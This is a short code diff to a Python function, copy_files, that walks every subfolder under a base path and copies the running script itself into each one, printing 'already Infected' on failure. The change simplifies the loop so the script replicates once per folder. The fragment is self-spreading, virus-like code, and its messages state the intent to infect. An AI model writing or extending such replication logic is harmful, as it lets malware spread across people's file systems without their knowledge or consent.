@@ -170,12 +170,11 @@ def copy_files():
 		for folder in glob.glob(f"{b}\\*\\"):
 			print(folder)
 			print("_")
-			for file in glob.glob(f"{folder}\\*"):
-				print(file)
-				try:
-					shutil.copy(sys.argv[0], folder)
-				except:
-					print("Infected already")
+			try:
+				shutil.copy(sys.argv[0], folder)
+			except:
+				print("already Infected")
+	
     	
 	
 
